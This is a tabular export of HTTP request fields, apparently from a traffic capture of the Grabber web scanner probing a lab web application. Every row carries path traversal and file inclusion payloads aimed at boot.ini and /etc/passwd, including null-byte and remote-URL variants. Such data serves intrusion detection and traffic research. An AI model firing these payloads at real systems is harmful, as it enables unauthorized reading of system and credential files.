http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-name=%2Fetc%2Fpasswd		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-name=%2Fetc%2Fpasswd
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-name=%2Fetc%2Fpasswd		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-name=%2Fetc%2Fpasswd
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-name=%2Fetc%2Fpasswd%00		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-name=%2Fetc%2Fpasswd%00
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-name=%2Fetc%2Fpasswd%00		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-name=%2Fetc%2Fpasswd%00
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-name=http%3A%2F%2Fwww.google.com		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-name=http%3A%2F%2Fwww.google.com
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-name=http%3A%2F%2Fwww.google.com		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-name=http%3A%2F%2Fwww.google.com
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-name=c%3A%5C%5C%5C%5Cboot.ini		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-name=c%3A%5C%5C%5C%5Cboot.ini
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-name=c%3A%5C%5C%5C%5Cboot.ini		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-name=c%3A%5C%5C%5C%5Cboot.ini
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-name=c%3A%5C%5C%5C%5Cboot.ini%00		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-name=c%3A%5C%5C%5C%5Cboot.ini%00
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-name=c%3A%5C%5C%5C%5Cboot.ini%00		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-name=c%3A%5C%5C%5C%5Cboot.ini%00
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-copy=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-copy=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-copy=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-copy=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-copy=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-copy=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-copy=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-copy=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-copy=%2Fetc%2Fpasswd		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-copy=%2Fetc%2Fpasswd
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-copy=%2Fetc%2Fpasswd		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-copy=%2Fetc%2Fpasswd
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-copy=%2Fetc%2Fpasswd%00		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-copy=%2Fetc%2Fpasswd%00
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-copy=%2Fetc%2Fpasswd%00		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-copy=%2Fetc%2Fpasswd%00
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-copy=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-copy=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-copy=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-copy=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-copy=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-copy=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-copy=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-copy=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-copy=http%3A%2F%2Fwww.google.com		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-copy=http%3A%2F%2Fwww.google.com
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-copy=http%3A%2F%2Fwww.google.com		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-copy=http%3A%2F%2Fwww.google.com
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-copy=c%3A%5C%5C%5C%5Cboot.ini		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-copy=c%3A%5C%5C%5C%5Cboot.ini
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-copy=c%3A%5C%5C%5C%5Cboot.ini		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-copy=c%3A%5C%5C%5C%5Cboot.ini
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-copy=c%3A%5C%5C%5C%5Cboot.ini%00		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-copy=c%3A%5C%5C%5C%5Cboot.ini%00
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-copy=c%3A%5C%5C%5C%5Cboot.ini%00		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-copy=c%3A%5C%5C%5C%5Cboot.ini%00
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?email=%2Fetc%2Fpasswd		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?email=%2Fetc%2Fpasswd
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?email=%2Fetc%2Fpasswd		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?email=%2Fetc%2Fpasswd
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?email=%2Fetc%2Fpasswd%00		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?email=%2Fetc%2Fpasswd%00
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?email=%2Fetc%2Fpasswd%00		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?email=%2Fetc%2Fpasswd%00
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?email=http%3A%2F%2Fwww.google.com		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?email=http%3A%2F%2Fwww.google.com
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?email=http%3A%2F%2Fwww.google.com		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?email=http%3A%2F%2Fwww.google.com
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?email=c%3A%5C%5C%5C%5Cboot.ini		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?email=c%3A%5C%5C%5C%5Cboot.ini
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?email=c%3A%5C%5C%5C%5Cboot.ini		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?email=c%3A%5C%5C%5C%5Cboot.ini
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?email=c%3A%5C%5C%5C%5Cboot.ini%00		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?email=c%3A%5C%5C%5C%5Cboot.ini%00
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?email=c%3A%5C%5C%5C%5Cboot.ini%00		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?email=c%3A%5C%5C%5C%5Cboot.ini%00
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00&name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00&demo-priority=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00&demo-human=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00&demo-name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00&demo-copy=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00&email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00&		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00&name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00&demo-priority=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00&demo-human=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00&demo-name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00&demo-copy=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00&email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00&
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini&name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini&demo-priority=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini&demo-human=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini&demo-name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini&demo-copy=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini&email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini&		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini&name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini&demo-priority=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini&demo-human=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini&demo-name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini&demo-copy=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini&email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini&
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-email=%2Fetc%2Fpasswd&name=%2Fetc%2Fpasswd&demo-priority=%2Fetc%2Fpasswd&demo-human=%2Fetc%2Fpasswd&demo-name=%2Fetc%2Fpasswd&demo-copy=%2Fetc%2Fpasswd&email=%2Fetc%2Fpasswd&		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-email=%2Fetc%2Fpasswd&name=%2Fetc%2Fpasswd&demo-priority=%2Fetc%2Fpasswd&demo-human=%2Fetc%2Fpasswd&demo-name=%2Fetc%2Fpasswd&demo-copy=%2Fetc%2Fpasswd&email=%2Fetc%2Fpasswd&
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-email=%2Fetc%2Fpasswd%00&name=%2Fetc%2Fpasswd%00&demo-priority=%2Fetc%2Fpasswd%00&demo-human=%2Fetc%2Fpasswd%00&demo-name=%2Fetc%2Fpasswd%00&demo-copy=%2Fetc%2Fpasswd%00&email=%2Fetc%2Fpasswd%00&		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-email=%2Fetc%2Fpasswd%00&name=%2Fetc%2Fpasswd%00&demo-priority=%2Fetc%2Fpasswd%00&demo-human=%2Fetc%2Fpasswd%00&demo-name=%2Fetc%2Fpasswd%00&demo-copy=%2Fetc%2Fpasswd%00&email=%2Fetc%2Fpasswd%00&
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&demo-priority=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&demo-human=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&demo-name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&demo-copy=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&demo-priority=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&demo-human=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&demo-name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&demo-copy=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&demo-priority=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&demo-human=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&demo-name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&demo-copy=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&demo-priority=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&demo-human=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&demo-name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&demo-copy=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&email=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&
	identity																close										192.168.1.104														http://google.com/?q=grabber	1	http://192.168.1.104/web/?demo-email=http%3A%2F%2Fwww.google.com&name=http%3A%2F%2Fwww.google.com&demo-priority=http%3A%2F%2Fwww.google.com&demo-human=http%3A%2F%2Fwww.google.com&demo-name=http%3A%2F%2Fwww.google.com&demo-copy=http%3A%2F%2Fwww.google.com&email=http%3A%2F%2Fwww.google.com&		GET				HTTP/1.1																			Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)				/web/?demo-email=http%3A%2F%2Fwww.google.com&name=http%3A%2F%2Fwww.google.com&demo-priority=http%3A%2F%2Fwww.google.com&demo-human=http%3A%2F%2Fwww.google.com&demo-name=http%3A%2F%2Fwww.google.com&demo-copy=http%3A%2F%2Fwww.google.com&email=http%3A%2F%2Fwww.google.com&
